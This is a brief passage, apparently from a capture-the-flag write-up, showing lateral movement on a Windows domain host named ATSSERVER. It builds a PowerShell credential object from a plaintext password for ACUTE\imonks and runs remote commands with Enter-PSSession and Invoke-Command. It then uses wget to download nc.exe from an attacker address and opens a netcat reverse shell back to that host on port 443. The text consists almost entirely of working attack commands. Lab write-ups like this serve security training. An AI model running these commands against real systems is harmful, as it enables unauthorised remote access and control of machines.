
We can get Command Execution using PowerShell Credential Objects and even authenticate against other Endpoints in the network.

```
$pass = ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlainText -Force
```

```
$cred = New-Object System.Management.Automation.PSCredential("ACUTE\imonks",$pass)
```

```
Enter-PSSession -ComputerName ATSSERVER -Credential $cred
```

---
##### Command Execution

If we can't utilize Enter-PSSession, we can utilize an functionality called "Invoke-Command" in order to exploit further.

```
Invoke-Command -ScriptBlock { whoami } -ComputerName ATSSERVER -Credential $cred
```

```
Invoke-Command -ComputerName ATSSERVER -Credential $cred -ScriptBlock { wget 10.10.14.57/nc.exe -outfile \programdata\nc64.exe }
```

```
rlwrap nc -lvnp 443
```

```
Invoke-Command -ComputerName ATSSERVER -Credential $cred -ScriptBlock { \programdata\nc.exe -e cmd 10.10.14.57 443}
```